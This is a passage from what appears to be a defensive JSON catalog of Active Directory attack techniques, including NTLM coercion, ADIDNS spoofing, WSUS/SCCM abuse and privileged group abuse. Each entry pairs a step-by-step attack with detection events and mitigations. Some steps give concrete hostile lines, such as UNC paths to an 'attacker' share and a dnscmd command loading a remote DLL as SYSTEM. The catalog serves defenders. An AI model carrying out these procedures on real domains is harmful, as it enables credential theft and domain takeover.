(lsadump::backupkeys), SharpDPAPI (backupkey/masterkeys), impacket dpapi.py backupkeys","detect":"Detect MS-BKRP (BackupKey Remote Protocol) calls to a DC from non-Tier0 processes. Monitor for anomalous RPC access to lsass/DC and SharpDPAPI's RPC retrieval pattern via EDR. Since the backup key cannot be re-obtained once leaked, treat the retrieval event itself as top priority.","events":"4662 (BootKey/BackupKeyオブジェクトアクセス), lsass関連の異常アクセス, MS-BKRP RPCログ","mitigate":"Strictly isolate admin access to DCs to Tier0; if leakage is already suspected, consider rolling over the domain backup key (effectively difficult and requiring planned handling). Protect lsass/DC RPC via EDR and minimize the number of Domain Admins."},{"name":"HiveNightmare / SeriousSAM","aka":"SeriousSAM, HiveNightmare","phase":"credaccess","group":"Host / Local","mitre":"T1003.002","cve":"CVE-2021-36934","sev":"High","summary":"A CVE where a misconfiguration on Windows 10/11 gives BUILTIN\\Users read ACLs on the SAM/SYSTEM/SECURITY hives, letting a non-admin steal local credentials via shadow copies.","how":"On a vulnerable host, read an existing VSS shadow copy (\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SAM) with non-admin rights. Extract local account NT hashes, LSA secrets (including the machine's DPAPI_SYSTEM key), and cached domain credentials from the hives for Pass-the-Hash or local privilege escalation (the user's own DPAPI master key resides in the profile and must be obtained separately). Works as a standard user if a System Restore point exists.","tools":"HiveNightmare(seri#$hive), mimikatz, impacket-secretsdump, PowerShell VSSアクセス","detect":"Detect non-admin process reads of SAM/SYSTEM/SECURITY under System32\\config and access to GLOBALROOT/ShadowCopy paths via Sysmon/EDR. Treat hive-file opens by standard-user processes as anomalous.","events":"4663 (SAM/SYSTEM/SECURITYへのアクセス), Sysmon 11/1 (ShadowCopyパスアクセス)","mitigate":"Apply the MS fix patch and remove excessive ACLs with icacls %windir%\\system32\\config\\*.* /inheritance. Delete existing VSS shadow copies (vssadmin delete shadows) to remove residual exposure."},{"name":"Outlook NTLM Leak (Coercion)","aka":"PidLidReminderFileParameter leak, Outlook zero-click NTLM","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"CVE-2023-23397","sev":"Critical","summary":"Email-based forced authentication that abuses the UNC reminder sound path (PidLidReminderFileParameter) of an Outlook calendar reminder to coerce the victim's Net-NTLM hash to an attacker server with no user interaction.","how":"Send a crafted appointment/task email with a UNC path (\\\\attacker\\share\\x.wav) set as PidLidReminderFileParameter and PidLidReminderOverride set to True. When Outlook processes the reminder, the victim authenticates over SMB to the UNC without even opening the mail, leaking Net-NTLMv2 to the attacker. The captured hash is used for relay (ESC8/LDAP) or offline cracking.","tools":"OutlookSpy/カスタムMAPIスクリプト, responder/impacket-ntlmrelayx, CVE-2023-23397.ps1(検査/PoC)","detect":"Use Microsoft's script (CVE-2023-23397.ps1) to scan mailboxes for items carrying a malicious PidLidReminderFileParameter. Detect outbound authentication from clients to unauthorized external/internal SMB (445) and connections to Responder.","events":"5145/4624 Type3 (SMB認証), ファイアウォールのアウトバウンド445, Exchangeメッセージトレース","mitigate":"Apply Outlook/Exchange security updates and block outbound external 445 at the perimeter. Add high-privilege users to Protected Users to disable NTLM, and apply Block NTLM policy."},{"name":"NTLM Reflection / Reflective SMB Relay","aka":"self-host authentication reflection, Reflective Kerberos/SMB relay","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2025-33073","sev":"High","summary":"A new class of relay vulnerability that reflects coerced authentication back to the originating host itself, exploiting missing SMB signing to escalate to SYSTEM.","how":"Use a specific marshaled name/alias (crafted SPN/name) to coerce a DC or host via PetitPotam etc., then reflect-relay that authentication back to the origin to establish an SMB session as local SYSTEM. It works where SMB signing is not enforced, using a reflection path distinct from LocalPotato/Drop-the-MIC.","tools":"impacket-ntlmrelayx(reflection対応), PetitPotam/Coercer, krbrelayx","detect":"Detect externally triggered self-directed SMB authentication within the same host (loopback-like 4624 Type3 immediately preceded by coercion RPC). Correlate coercion RPC (EFSRPC/MS-RPRN etc.) with an immediately following SYSTEM session establishment.","events":"4624 Type3 (自ホスト宛), 5145, EFSRPC/PrinterBug RPC呼び出しログ","mitigate":"Apply the June 2025 or later security updates. Require SMB signing on all hosts and enable Extended Protection for Authentication (EPA) and SMB server signing enforcement. Block coercion paths (EFSRPC/PrinterBug)."},{"name":"ADIDNS Spoofing","aka":"Invoke-DNSUpdate, wildcard/WPAD record injection, dnstool","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557","cve":"","sev":"High","summary":"Technique where an authenticated user adds arbitrary records (wildcard/WPAD) to an AD-integrated DNS zone via dynamic updates, hijacking name resolution to intercept and relay traffic.","how":"Abuse the default permission that lets Authenticated Users create records in AD-integrated DNS zones, injecting a wildcard (*) or WPAD record with Invoke-DNSUpdate or dnstool.py. Even when WPAD is protected by GlobalQueryBlockList, a wildcard hijacks name resolution comprehensively, enabling capture/relay even where LLMNR/mDNS is disabled.","tools":"Invoke-DNSUpdate (Powermad/DNS), krbrelayx dnstool.py, aiodnsbrute, Responder(捕捉側)","detect":"Detect dynamic registration of wildcard (*) or WPAD records and record additions by ordinary users via DNS server dnsServerLog/auditing. Periodically audit anomalous new records (short TTL, attacker IP) in the ADIDNS zone.","events":"DNS Server監査 515/516(レコード作成/削除), 513/514(ゾーン操作), 5136(dnsNodeオブジェクト変更), 4662","mitigate":"Keep wpad/isatap in GlobalQueryBlockList and consider enabling wildcard query blocking. Review ADIDNS zone ACLs to restrict dynamic updates to Secure-only and least privilege, and remove existing suspicious records."},{"name":"Share-placed NTLM Coercion","aka":"SCF/.library-ms/.url/LNK/desktop.ini poisoning, Farmer/Lnkbomb","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187","cve":"","sev":"Medium","summary":"Classic coercion that places crafted files (SCF/.library-ms/.url/LNK/desktop.ini) on a writable share so that explorer forces Net-NTLM authentication to an attacker UNC when the folder is browsed.","how":"Place .SCF, .library-ms, .url, .lnk, or desktop.ini whose icon/sound/library reference points to an attacker UNC (\\\\attacker\\share) on a world-writable file share. When the victim opens the folder, explorer authenticates over SMB for preview/icon resolution, leaking Net-NTLMv2 to Responder for relay or cracking.","tools":"ntlm_theft, Farmer, Lnkbomb, responder/ntlmrelayx, Snaffler(書込共有発見)","detect":"Detect creation of .scf/.library-ms/.url/desktop.ini etc. on file shares (FileServer auditing/Sysmon 11). Monitor for numerous outbound SMB authentications from workstations to unknown UNCs and connections to Responder's responding IP.","events":"5145 (共有ファイルアクセス), 4663/Sysmon 11 (共有への細工ファイル作成), 4624 Type3","mitigate":"Minimize write ACLs on shares and reduce user-writable public folders. Restrict outbound external 445 at perimeter/internal and enforce SMB signing and EPA. Protect high-privilege users with Protected Users/Block NTLM."},{"name":"NTLMv1 Downgrade & Crack","aka":"crack.sh, DES cracking, LmCompatibilityLevel downgrade","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1550.002","cve":"","sev":"High","summary":"Technique that forces authentication down to NTLMv1; since the response is DES-based, a fixed challenge plus crack.sh fully recovers the NT hash.","how":"Use Responder etc. to fix the challenge to a static value (1122334455667788) and induce NTLMv1 authentication, collecting Net-NTLMv1 responses from coerced victim hosts (especially DC machine accounts). Because it is DES-based, a fixed challenge lets crack.sh deterministically recover the NT hash, feeding directly into Pass-the-Hash, Silver Ticket, or DCSync.","tools":"Responder (--lm / challenge固定), impacket, crack.sh, hashcat (-m 5500), PetitPotam(強制)","detect":"Detect the occurrence of NTLMv1 authentication itself via Netlogon/4624 package names or NTLM auditing. Inventory responses containing the fixed challenge (1122334455667788) and hosts with legacy LmCompatibilityLevel.","events":"8004/8003 (NTLM監査 Netlogon), 4624 (認証パッケージNTLMv1), Restrict NTLM監査ログ","mitigate":"Force LmCompatibilityLevel to 5 (NTLMv2 only, reject LM/NTLMv1). Use Restrict NTLM auditing to surface and retire residual NTLMv1, and advance Protected Users and NTLM disablement."},{"name":"RemotePotato0 / Cross-session RPC Relay","aka":"RemotePotato0, cross-session NTLM relay","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187, T1557","cve":"","sev":"High","summary":"Local privilege escalation that induces the NTLM authentication of an admin/DA interactively logged on to the same host via DCOM/RPC and cross-protocol relays it to LDAP etc. to seize domain privileges.","how":"With low privilege, abuse RPCSS/DCOM activation on a shared host to trigger the NTLM authentication of a high-privilege user (admin/DA) logged on to the same host. Forward that NTLM authentication to a remote attacker relay machine and cross-session relay it to LDAP/SMB to grant RBCD or self-assign DCSync rights. Especially effective against LDAP relay to DCs where LDAP signing/channel binding (EPA) is not enforced (SMB signing is an SMB-relay-side defense and is irrelevant to LDAP relay success).","tools":"RemotePotato0, impacket-ntlmrelayx (LDAPターゲット), socat(中継)","detect":"Detect signs of an interactively logged-on privileged user's credentials being NTLM-relayed to another host/DC (brief anomalous LDAP writes, RBCD attribute changes). Monitor for anomalous DCOM activation by low-privilege processes on shared terminals.","events":"5136 (msDS-AllowedToActOnBehalf変更), 4662 (WriteDACL/DCSync), 4624 Type3 (リレー先)","mitigate":"Enforce EPA and LDAP signing/channel binding to block cross-protocol relay. Keep privileged users from interactive logon on shared terminals (Tier separation), and apply Protected Users/NTLM disablement."},{"name":"SCCM Client Push / NAA Relay","aka":"SharpSCCM client push relay, NAA credential theft","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187, T1557","cve":"","sev":"High","summary":"Attack surface that induces the site-server-driven authentication performed by SCCM client push installation to relay it to MSSQL/HTTP etc., and also recovers NAA credentials for domain lateral movement.","how":"Force client push with SharpSCCM to make the site server's management account (or machine account) authenticate to a controlled host, and relay that authentication with ntlmrelayx to MSSQL (site DB) or HTTP (management point) to gain site admin rights or DB access. Additionally decrypt NAA credentials from distribution policy to recover a legitimate domain account usable for lateral movement.","tools":"SharpSCCM (invoke client-push), impacket-ntlmrelayx (MSSQL/HTTP), sccmhunter, PXEThief","detect":"Detect unexpected outbound authentication from the site server/push install account to unexpected hosts, and anomalous relay connections to the MSSQL site DB. Monitor abuse of client push settings and anomalous logon sources for the NAA account.","events":"4624/4648 (プッシュアカウント認証), MSSQL監査ログ, MP IISログ, 4662","mitigate":"Disable client push installation and migrate to Enhanced HTTP/PKI + management point authentication. Retire NAA (or make it a least-privilege, logon-denied account), and enforce SMB signing/EPA on site server communications."},{"name":"Pre-created / Stale Computer Account Takeover","aka":"default password = lowercase computer name, pre2k, unjoined machine account","phase":"privesc","group":"Delegation","mitre":"T1078.002","cve":"","sev":"High","summary":"Technique that abuses the fact that a pre-created but unjoined computer account has a default password equal to the lowercase computer name, taking over the account to enable RBCD etc.","how":"Enumerate computer objects with PASSWD_NOTREQD or unjoined-state flags in userAccountControl and attempt authentication with password = lowercase computer name (e.g., WKSTA01$ has password wksta01). On success, take over the machine account and use it to set Shadow Credentials/RBCD/delegation for domain lateral movement and escalation. Especially likely with stale accounts in old domains.","tools":"pre2k, NetExec, impacket (changepasswd/getTGT), Rubeus","detect":"Inventory computer accounts with PASSWD_NOTREQD or long logon inactivity, and detect authentication success with default-equivalent passwords (4624/4768). Monitor authentication attempts using a password identical to the machine account name.","events":"4768/4624 (マシンアカウント認証), 4741/4742 (作成/UAC変更), 陳腐化アカウント棚卸し","mitigate":"Have an admin pre-create computer accounts at join time and join immediately, and delete/disable PASSWD_NOTREQD or long-unused accounts. Avoid delegation of join and run pre2k scans regularly."},{"name":"Kerberos U2U (User-to-User) Abuse","aka":"User-to-User TGS, S4U2self+U2U, Sapphire Ticket foundation","phase":"credaccess","group":"Kerberos","mitre":"T1558","cve":"","sev":"Medium","summary":"User-to-User authentication that obtains a TGS using a user TGT as the key without requiring an SPN. An independent technique that underpins Sapphire Ticket creation and privileged ticket acquisition.","how":"In U2U, the service ticket is encrypted with the counterpart user's TGT session key rather than the service's long-term key, so even against a user with no registered SPN, combining S4U2self+U2U yields a TGS containing a privileged user's PAC. This is the basis for Sapphire Ticket (reusing a legitimate privileged user's PAC) and for getcredentials' U2U usage.","tools":"Rubeus (asktgs /u2u, tgssub), impacket (getST -u2u), mimikatz","detect":"Detect Kerberos ticket requests indicating U2U (the ENC-TKT-IN-SKEY flag in the TGS-REQ) and anomalous ticket acquisition combining S4U2self and U2U. Monitor for anomalous issuance of a TGS containing a privileged user PAC and for Sapphire Ticket indicators.","events":"4769 (TGS要求, U2Uフラグ), 4768, PAC検証関連","mitigate":"Enforce AES encryption and deploy Kerberos armoring (FAST), and place privileged accounts in Protected Users. Operate periodic KRBTGT rotation and anomalous ticket detection (PAC inconsistency)."},{"name":"MSSQL Lateral Movement (Linked Servers / Impersonation)","aka":"linked server chaining, xp_cmdshell, TRUSTWORTHY DB, EXECUTE AS","phase":"lateral","group":"Management Infra Abuse (SCCM/WSUS/MSSQL)","mitre":"T1210","cve":"","sev":"High","summary":"A core set of lateral movement and privilege escalation techniques: traversal via linked server chaining, DB impersonation via EXECUTE AS/TRUSTWORTHY, and OS command execution via xp_cmdshell.","how":"After accessing MSSQL with a low-privilege login, traverse to other instances by following linked servers (OPENQUERY chaining) and execute as sysadmin remotely. Escalate to sysadmin via db_owner of a TRUSTWORTHY ON DB with EXECUTE AS OWNER, or impersonate with EXECUTE AS LOGIN, ultimately running OS commands under the SQL service account with xp_cmdshell/OLE Automation/sp_OACreate or a CLR assembly.","tools":"PowerUpSQL, mssqlclient.py(impacket), SQLRecon, Chisel/xp_cmdshell","detect":"Detect enabling/execution of xp_cmdshell, cross-server queries via linked servers, and use of EXECUTE AS/IMPERSONATE via SQL auditing. Monitor for unexpected child processes (cmd.exe/powershell.exe) from the SQL service account via EDR.","events":"SQL Server監査 (xp_cmdshell実行, IMPERSONATE), Sysmon 1 (sqlservr.exe子プロセス), 4688","mitigate":"Disable xp_cmdshell/OLE Automation and enable CLR strict security. Map linked server remote logins to least privilege, set TRUSTWORTHY OFF, and make the SQL service account a non-privileged gMSA. Restrict SQL-to-SQL communication at the network level."},{"name":"WSUS Abuse (Malicious Update Distribution)","aka":"SharpWSUS, WSUSpendu, malicious update distribution","phase":"lateral","group":"Management Infra Abuse (SCCM/WSUS/MSSQL)","mitre":"T1072","cve":"","sev":"High","summary":"Technique that seizes a WSUS server and distributes/executes a signed binary (e.g., PsExec) as an approved update to downstream endpoints for lateral movement.","how":"After accessing the WSUS server (or its SUSDB), use SharpWSUS/WSUSpendu to register and approve a Microsoft-signed binary (e.g., psexec.exe) as a fake update with command-line arguments, distributing it to target computers. Abuse configurations where WSUS delivers over HTTP (signature verification covers only the signer) and injectable approvals to reach SYSTEM execution on clients.","tools":"SharpWSUS, WSUSpendu, PyWSUS(HTTP中間者), PsExec(ペイロード)","detect":"Detect direct writes to SUSDB, unexpected manually approved updates, and updates whose distributed binary carries command-line arguments via WSUS/event logs. On the client side, monitor for psexec etc. spawned by wuauclt/TiWorker and anomalous processes running as SYSTEM.","events":"WSUSイベントログ, SUSDB監査, Sysmon 1 (wuauclt→psexec等), 4688","mitigate":"Deliver WSUS over HTTPS+TLS and protect the WSUS server as a Tier0 asset. Restrict access to SUSDB, enforce separation of duties for update approval, and minimize WSUS server administrators."},{"name":"SCCM Application/Script Deployment Lateral Movement","aka":"SharpSCCM exec, collection deployment abuse","phase":"lateral","group":"Management Infra Abuse (SCCM/WSUS/MSSQL)","mitre":"T1072","cve":"","sev":"High","summary":"Lateral movement that abuses SCCM's legitimate application/script deployment features, using full admin rights to execute a SYSTEM-privileged payload on endpoints in a collection.","how":"After gaining SCCM Full Administrator or equivalent rights, use SharpSCCM or the AdminService to create an application deployment or immediate CMScripts execution against devices/collections, making the target's SCCM client (ccmexec, SYSTEM) run the payload. Because it uses legitimate management channels, it blends in with normal operations and is hard to spot via EDR.","tools":"SharpSCCM (invoke), sccmhunter (exec), AdminService API, CMPivot/Scripts","detect":"Detect creation of application deployments/script executions by non-console/unauthorized operators, and short-lived deployments with immediate rollout, via SCCM auditing/AdminService logs. On clients, monitor for anomalous ccmexec→cmd/powershell child processes.","events":"SCCM監査状態メッセージ, AdminServiceログ, Sysmon 1 (ccmexec.exe子プロセス), 4688","mitigate":"Minimize SCCM RBAC (roles) and tightly control Full Administrator. Enable script execution approval (approver separation), protect the site server/SMS provider as Tier0, and alert on deployment creation via auditing."},{"name":"PrimaryGroupID Tampering","aka":"primaryGroupID rewrite, stealth group membership","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098","cve":"","sev":"High","summary":"Stealth privilege escalation that rewrites a target user's primaryGroupID to 512/519/544 etc. to gain effective membership in a privileged group without touching the group's member attribute.","how":"When you have write rights (GenericWrite etc.) over a target user object, rewrite the primaryGroupID attribute to the RID of a domain global privileged group such as Domain Admins (512) or Enterprise Admins (519) (primaryGroupID can only store a domain-relative RID, so domain-local groups such as 544=BUILTIN Administrators cannot be specified). Because primaryGroup-based membership does not appear in the group's member attribute, it evades ordinary group membership audits while effectively conferring the privileged group's rights.","tools":"PowerView (Set-DomainObject), ldapmodify, ADSI/Set-ADUser","detect":"Detect primaryGroupID changes (5136) on users/computers and immediately alert on changes to privileged RIDs such as 512/519/518/544. Inventory the effective members of privileged groups including primaryGroupID.","events":"5136 (primaryGroupID属性変更), 4738 (user account changed), 4662","mitigate":"Minimize write ACLs on privileged objects and remove excessive delegation such as GenericWrite. Monitor primaryGroupID changes in SIEM, verify AdminSDHolder-protected objects, and run periodic effective-member audits."},{"name":"userAccountControl Write Abuse","aka":"granting TRUSTED_FOR_DELEGATION, PASSWD_NOTREQD, DONT_EXPIRE_PASSWD","phase":"privesc","group":"ACL / Object Permissions","mitre":"T1098","cve":"","sev":"High","summary":"Privilege-escalation via writes to a target's userAccountControl, abusing UAC bits such as unconstrained delegation (TRUSTED_FOR_DELEGATION) or removing the password requirement (excludes DONT_REQ_PREAUTH).","how":"With write access alone: PASSWD_NOTREQD (0x20) allows password-less authentication, DONT_REQ_PREAUTH enables AS-REP Roasting, and DONT_EXPIRE_PASSWD provides persistence. Note: newly enabling unconstrained delegation via TRUSTED_FOR_DELEGATION (0x80000) requires SeEnableDelegationPrivilege on the DC (normally DA-equivalent only), so generic write access alone is insufficient. Each UAC bit enables varied abuse.","tools":"PowerView (Set-DomainObject useraccountcontrol), bloodyAD, ldapmodify, Rubeus(委任悪用)","detect":"Detect userAccountControl changes (5136/4738/4742), especially setting the TRUSTED_FOR_DELEGATION bit or PASSWD_NOTREQD, in real time. Alert on unconstrained delegation granted to non-DC objects as high risk.","events":"4738/4742 (UAC変更), 5136 (userAccountControl属性), 4662","mitigate":"Minimize write ACLs on objects and monitor/forbid newly created unconstrained delegation. Place privileged/sensitive accounts in Protected Users and set \"Account is sensitive and cannot be delegated\" (NOT_DELEGATED); alert on UAC audit changes."},{"name":"msDS-AllowedToDelegateTo Write (Constrained Delegation)","aka":"new KCD, granting protocol transition, S4U2proxy abuse","phase":"privesc","group":"Delegation","mitre":"T1098","cve":"","sev":"High","summary":"A write edge that adds a constrained delegation (KCD) path via the target's msDS-AllowedToDelegateTo attribute, gaining arbitrary-user impersonation through S4U with protocol transition.","how":"With write access to the target account, add a target SPN (e.g. cifs/dc) to msDS-AllowedToDelegateTo and set TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition) in userAccountControl (note: setting this bit requires SeEnableDelegationPrivilege, normally DA-equivalent only; the write edge alone yields Kerberos-only constrained delegation without protocol transition). From a controlled account, use S4U2self+S4U2proxy to obtain a service ticket impersonating any user (including DA) and access the target service.","tools":"PowerView (Set-DomainObject), Rubeus (s4u), impacket (getST -impersonate), bloodyAD","detect":"Detect changes to the msDS-AllowedToDelegateTo attribute (5136) and setting of the TRUSTED_TO_AUTH_FOR_DELEGATION bit. Monitor abnormal S4U2self/S4U2proxy ticket requests (4769 delegation flags, impersonated-user/service combinations).","events":"5136 (msDS-AllowedToDelegateTo変更), 4738/4742, 4769 (S4U TGS)","mitigate":"Minimize write ACLs on delegation attributes and alert on new KCD configuration. Place sensitive accounts in Protected Users/mark them non-delegatable, inventory and minimize delegation-target SPNs, and deploy AES and FAST."},{"name":"Backup Operators Abuse","aka":"Backup Operators, lawful SeBackupPrivilege abuse","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1003.003, T1078.002","cve":"","sev":"Critical","summary":"Built-in group abuse using Backup Operators' SeBackupPrivilege/SeRestorePrivilege legitimately to obtain the DC's NTDS.dit and registry, compromising the entire domain.","how":"Backup Operators members log on to a DC over the network and use SeBackupPrivilege to copy NTDS.dit and the SYSTEM hive (diskshadow/esentutl/robocopy /b), or save SAM/SECURITY via remote registry. From the obtained hives, secretsdump extracts all domain hashes (including krbtgt), amounting to a DCSync-equivalent domain compromise. SeRestorePrivilege also enables escalation via binary replacement.","tools":"diskshadow, esentutl, robocopy /b, reg save, impacket-secretsdump, SeBackupPrivilegeCmdLets","detect":"Detect Backup Operators membership changes (4732), interactive/network logons to DCs, and access to NTDS.dit. Monitor SeBackupPrivilege use by non-backup products and diskshadow launches.","events":"4732 (グループ追加), 4672 (特権割当), 4663 (ntds.dit), Sysmon 1 (diskshadow/esentutl)","mitigate":"Treat Backup Operators as Tier0 and remove/minimize members; perform backups with dedicated, limited privileges. Separate DC logon rights, audit NTDS.dit access, and verify AdminSDHolder protection."},{"name":"Server Operators Abuse","aka":"Server Operators, sc config service tampering","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1543.003","cve":"","sev":"Critical","summary":"Built-in group abuse where Server Operators modify a DC service configuration (binPath) to run arbitrary commands as SYSTEM and take over the domain.","how":"Because Server Operators can manage services on a DC, use sc config <service> binPath= to rewrite an existing service's (e.g. a stopped service) binary path to an attacker command, then restart the service to run as LocalSystem. Obtaining SYSTEM on a DC leads directly to NTDS extraction and krbtgt theft. Members also hold SeBackupPrivilege and similar.","tools":"sc.exe (config/start), NetExec, PsExec, services.msc相当API","detect":"Detect DC service binPath changes (4697 service install/modify, 7045) and operations by Server Operators. Monitor for an existing service's image path changing to a non-standard binary/cmd/powershell.","events":"4697/7045 (サービス変更・インストール), 4732 (グループ追加), 4672","mitigate":"Keep Server Operators at zero members and manage strictly as Tier0. Audit DC service changes, alert on privileged group membership changes, and verify AdminSDHolder protection."},{"name":"Account Operators Abuse","aka":"Account Operators, non-protected user/group manipulation","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1098","cve":"","sev":"High","summary":"Built-in group abuse exploiting Account Operators' ability to create/modify non-protected users and groups, moving laterally and escalating via credential resets and group manipulation.","how":"Account Operators can create/delete non-AdminSDHolder-protected users/groups, reset passwords, and change membership. Take over an account by resetting a target user's password, or add yourself to a controllable delegated group (e.g. one with GPO edit rights) to chain into ACL-based escalation. Protected groups like DA can't be manipulated directly, but non-protected objects leading to them serve as stepping stones.","tools":"net user/group, PowerView, bloodyAD, Set-ADAccountPassword","detect":"Detect password resets by Account Operators (4724) and user/group creation/modification (4720/4728/4732/4738). Monitor member additions to non-protected but effectively powerful delegated groups.","events":"4724 (パスワードリセット), 4720/4738 (ユーザ作成/変更), 4728/4732 (グループ追加)","mitigate":"Keep Account Operators at zero members and use individual custom ACLs for delegation instead. Inventory delegated-group nesting and rights, protect sensitive groups with AdminSDHolder-equivalent measures, and alert on reset/add operations."},{"name":"Print Operators Abuse (SeLoadDriverPrivilege / BYOVD)","aka":"Print Operators, SeLoadDriverPrivilege, BYOVD kernel escalation","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1068","cve":"","sev":"High","summary":"Built-in group abuse exploiting Print Operators' SeLoadDriverPrivilege to load a signed vulnerable driver (BYOVD) and gain local SYSTEM/DC escalation with kernel privileges.","how":"Print Operators hold SeLoadDriverPrivilege and can load user-specified drivers via NtLoadDriver. Load Capcom.sys or another signed vulnerable driver (BYOVD) to achieve arbitrary kernel code execution and SYSTEM escalation. Print Operators are also allowed to log on to DCs, so this can directly yield SYSTEM on a DC.","tools":"EoPLoadDriver, Capcom.sys, その他BYOVDドライバ, SeLoadDriverPrivilege PoC","detect":"Detect SeLoadDriverPrivilege use, loading of non-standard drivers (Sysmon 6 driver load, signature/hash), and loading of known vulnerable drivers. Correlate Print Operators member activity with driver loads.","events":"Sysmon 6 (driver load), 4673/4674 (特権使用), 4732 (グループ追加), 7045","mitigate":"Keep Print Operators at zero members. Enable the Microsoft Vulnerable Driver Blocklist (HVCI/WDAC) to block BYOVD, allow-list driver loading, and separate DC logon rights."},{"name":"DnsAdmins Abuse (ServerLevelPluginDll)","aka":"dnscmd /serverlevelplugindll, DNS DLL injection","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1543","cve":"","sev":"High","summary":"A classic privilege escalation where DnsAdmins make the DNS service load an arbitrary DLL via ServerLevelPluginDll, gaining SYSTEM code execution on the DC.","how":"DnsAdmins members can set an arbitrary DLL path on the DNS server with dnscmd <dc> /config /serverlevelplugindll \\\\attacker\\share\\evil.dll; on DNS service (dns.exe, SYSTEM) restart the DLL is loaded and executes code as SYSTEM. DNS often runs on DCs, so this leads directly to DC compromise and domain takeover.","tools":"dnscmd, DNSAdmin-DLL(msfvenom DLL), NetExec, PowerShell (DnsServer module)","detect":"Detect changes to the ServerLevelPluginDll registry/setting, non-standard DLL loads by the DNS service (Sysmon 7), and abnormal child processes of dns.exe. Correlate DnsAdmins member changes with DNS service restarts.","events":"770 (DNS Server log), Sysmon 7 (dns.exe image load), 7040 (サービス状態), レジストリ監査 ServerLevelPluginDll","mitigate":"Keep DnsAdmins at zero/minimized and treat as Tier0. Audit/forbid ServerLevelPluginDll changes, separate DNS from DCs (where possible), and restrict remote dnscmd operations."},{"name":"Key Admins / Enterprise Key Admins Abuse","aka":"msDS-KeyCredentialLink write on all objects, domain-wide Shadow Credentials","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1556","cve":"","sev":"Critical","summary":"An often-overlooked built-in group: because Key Admins/Enterprise Key Admins can write msDS-KeyCredentialLink on all objects, they can set Shadow Credentials domain-wide and authenticate as any account.","how":"Key Admins (or the forest's Enterprise Key Admins) members can write an attacker's certificate (public key) to the msDS-KeyCredentialLink attribute of any user/computer. Add a KeyCredential with Whisker/pyWhisker, obtain a TGT as that target (including DA/DC) via PKINIT (Pass-the-Certificate), and recover the NT hash for full impersonation.","tools":"Whisker, pyWhisker, Rubeus (asktgt /getcredentials), Certipy (shadow)","detect":"Monitor msDS-KeyCredentialLink attribute changes (5136) across all objects and detect Key Admins/Enterprise Key Admins member changes. Correlate KeyCredential additions to privileged accounts with subsequent PKINIT authentication.","events":"5136 (msDS-KeyCredentialLink変更), 4768 (PKINIT TGT), 4732/4756 (グループ追加)","mitigate":"Keep Key Admins/Enterprise Key Admins empty and manage as Tier0. Alert on msDS-KeyCredentialLink changes, inventory NGC/KeyCredential where ADCS is unused, and protect privileged accounts."},{"name":"Exchange Privilege Escalation (WriteDACL to Domain)","aka":"Exchange Windows Permissions, PrivExchange (non-relay), CVE-2019-0724","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1098","cve":"","sev":"Critical","summary":"Abuses the excessive ACL granted by an Exchange install (Exchange Windows Permissions' WriteDACL on the domain object) to grant oneself DCSync rights and take over the domain.","how":"The Exchange Windows Permissions group holds WriteDACL on the domain object, so controlling that group (or Exchange Trusted Subsystem) lets you add a Replicating Directory Changes/All (DCSync) ACE for your account to the domain root DACL. Then use secretsdump/DCSync to obtain all hashes (krbtgt) and dominate the domain. Unlike the relay-based PrivExchange, this works as an ACL abuse.","tools":"PowerView (Add-DomainObjectAcl), impacket-dacledit, aclpwn, ntdsutil/secretsdump","detect":"Detect ACE additions to the domain root DACL, especially granting DS-Replication-Get-Changes-family ACEs (5136 nTSecurityDescriptor change). Correlate Exchange-related group member/ACL changes with immediate DCSync (4662).","events":"5136 (nTSecurityDescriptor / DCSync ACE), 4662 (Replication権限使用), 4732","mitigate":"Adopt the Exchange split-permission model and reduce Exchange Windows Permissions' domain WriteDACL (apply MS mitigation guidance). Audit domain root DACL changes and protect Exchange servers/groups as Tier0."},{"name":"Delegated Group Abuse (Cert Publishers / DHCP Admins / GPCO)","aka":"Cert Publishers, DHCP Administrators, Group Policy Creator Owners abuse","phase":"privesc","group":"Privileged Group Abuse","mitre":"T1098","cve":"","sev":"High","summary":"A cluster of escalation/persistence paths abusing the rights of often-overlooked built-in/delegated groups (Cert Publishers, DHCP Administrators, Group Policy Creator Owners, etc.).","how":"Group Policy Creator Owners can create new GPOs; combined with link rights, deploy immediate tasks to endpoints under an OU for lateral movement. DHCP Administrators can manipulate DHCP/DNS dynamic-update settings, leading to name-resolution tampering. Cert Publishers may be involved in writing userCertificate on computer objects. Each builds a privilege path from an underestimated delegated group.","tools":"PowerView, GPOwned/SharpGPOAbuse, bloodyAD, netsh dhcp","detect":"Detect member changes to these delegated groups (4728/4732/4756) and GPO creation or DHCP/DNS setting changes using their rights. Periodically assess each group's effective reach (Outbound Control) with BloodHound.","events":"4728/4732/4756 (グループ追加), 5136 (GPO/ACL変更), 5137 (GPOオブジェクト作成)","mitigate":"Inventory and minimize members of each delegated group and limit GPO create/link rights of Group Policy Creator Owners and similar. Visualize attack paths with BloodHound, remove excessive delegation, and alert on changes."},{"name":"Schema Admins / defaultSecurityDescriptor Abuse","aka":"schema class defaultSecurityDescriptor tampering, permanent backdoor ACE","phase":"dominance","group":"Dominance & Persistence","mitre":"T1098","cve":"","sev":"Critical","summary":"An advanced domain-domination/persistence technique that tampers with a schema class's defaultSecurityDescriptor to plant a permanent backdoor ACE on all future-created objects.","how":"With Schema Admins rights, rewrite a schema class's (e.g. user, computer) defaultSecurityDescriptor to embed a FullControl/GenericAll ACE for the attacker SID. Thereafter all new objects created from that class inherit the attacker-controlled ACE, forming a long-term persistence backdoor that recovers control via new objects even after patching or permission resets. Schema changes affect the entire forest and are highly irreversible.","tools":"ldapmodify, ADSI Edit, PowerShell (Set-ADObject on schema)","detect":"Treat 